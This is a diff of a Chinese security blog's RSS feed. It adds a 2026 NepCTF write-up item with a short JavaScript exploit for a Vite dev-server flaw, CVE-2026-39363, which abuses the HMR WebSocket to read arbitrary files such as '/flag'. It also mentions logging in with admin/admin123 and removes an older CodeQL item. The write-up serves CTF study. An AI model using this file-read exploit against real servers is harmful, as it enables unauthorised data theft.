@@ -1,4 +1,54 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>美咕噜的小站</title><link>https://0d000721999.github.io/</link><description>Recent content on 美咕噜的小站</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>无敌可爱美咕噜</copyright><lastBuildDate>Wed, 29 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://0d000721999.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>fastjson2 2.0.62 RCE分析</title><link>https://0d000721999.github.io/p/fastjson2-2.0.62-rce%E5%88%86%E6%9E%90/</link><pubDate>Wed, 29 Jul 2026 00:00:00 +0000</pubDate><guid>https://0d000721999.github.io/p/fastjson2-2.0.62-rce%E5%88%86%E6%9E%90/</guid><description>&lt;img src="https://0d000721999.github.io/p/fastjson2-2.0.62-rce%E5%88%86%E6%9E%90/1_hu_7cd892a0848150d4.webp" alt="Featured image of post fastjson2 2.0.62 RCE分析" />&lt;h1 id="fastjson2-2062-rce分析">fastjson2 2.0.62 RCE分析
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>美咕噜的小站</title><link>https://0d000721999.github.io/</link><description>Recent content on 美咕噜的小站</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>无敌可爱美咕噜</copyright><lastBuildDate>Fri, 31 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://0d000721999.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>2026nepctf复现</title><link>https://0d000721999.github.io/p/2026nepctf%E5%A4%8D%E7%8E%B0/</link><pubDate>Fri, 31 Jul 2026 00:00:00 +0000</pubDate><guid>https://0d000721999.github.io/p/2026nepctf%E5%A4%8D%E7%8E%B0/</guid><description>&lt;img src="https://0d000721999.github.io/p/2026nepctf%E5%A4%8D%E7%8E%B0/1_hu_1404add23a478c39.webp" alt="Featured image of post 2026nepctf复现" />&lt;h1 id="2026nepctf复现">2026nepctf复现
+&lt;/h1>&lt;h2 id="挂钩都在干什么呢">挂钩都在干什么呢？
+&lt;/h2>&lt;p>CVE-2026-39363&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">ws&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">WebSocket&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">target&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;vite-hmr&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ws&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">onopen&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nx">ws&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">JSON&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">stringify&lt;/span>&lt;span class="p">({&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">        &lt;span class="nx">type&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;custom&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">        &lt;span class="nx">event&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;vite:invoke&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">        &lt;span class="nx">data&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">            &lt;span class="nx">name&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;fetchModule&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">            &lt;span class="nx">id&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;flag&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">            &lt;span class="nx">data&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;/flag?raw&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{}],&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">        &lt;span class="p">},&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="p">}))&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ws&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">onmessage&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">event&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="kr">const&lt;/span> &lt;span class="nx">msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">JSON&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">event&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="kr">const&lt;/span> &lt;span class="nx">code&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">msg&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">result&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">code&lt;/span> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">        &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="p">)&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">        &lt;span class="nx">ws&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">close&lt;/span>&lt;span class="p">()&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="文档编辑系统">文档编辑系统
+&lt;/h2>&lt;p>弱密码admin/admin123登入，最开始测试注册和登入普通用户，发现cookie是JSESSIONID，所以肯定是java&lt;/p></description></item><item><title>fastjson2 2.0.62 RCE分析</title><link>https://0d000721999.github.io/p/fastjson2-2.0.62-rce%E5%88%86%E6%9E%90/</link><pubDate>Wed, 29 Jul 2026 00:00:00 +0000</pubDate><guid>https://0d000721999.github.io/p/fastjson2-2.0.62-rce%E5%88%86%E6%9E%90/</guid><description>&lt;img src="https://0d000721999.github.io/p/fastjson2-2.0.62-rce%E5%88%86%E6%9E%90/1_hu_7cd892a0848150d4.webp" alt="Featured image of post fastjson2 2.0.62 RCE分析" />&lt;h1 id="fastjson2-2062-rce分析">fastjson2 2.0.62 RCE分析
 &lt;/h1>&lt;p>payload跟1.2.83类似，唯一的区别在于要绕过哈希校验，也就是要哈希碰撞一下&lt;/p>
 &lt;div class="highlight">&lt;div class="chroma">
 &lt;table class="lntable">&lt;tr>&lt;td class="lntd">
@@ -405,5 +455,4 @@ class="gallery-image"
 data-flex-grow="285"
 data-flex-basis="685px"
 >
-&lt;/p></description></item><item><title>Codeql审计实战</title><link>https://0d000721999.github.io/p/codeql%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/</link><pubDate>Fri, 19 Dec 2025 00:00:00 +0000</pubDate><guid>https://0d000721999.github.io/p/codeql%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/</guid><description>&lt;img src="https://0d000721999.github.io/p/codeql%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/1_hu_51556b7bc849dd23.webp" alt="Featured image of post Codeql审计实战" />&lt;h1 id="codeql审计实战">Codeql审计实战
-&lt;/h1>&lt;p>参考：https://www.synacktiv.com/publications/finding-gadgets-like-its-2022&lt;/p></description></item></channel></rss>
+&lt;/p></description></item></channel></rss>
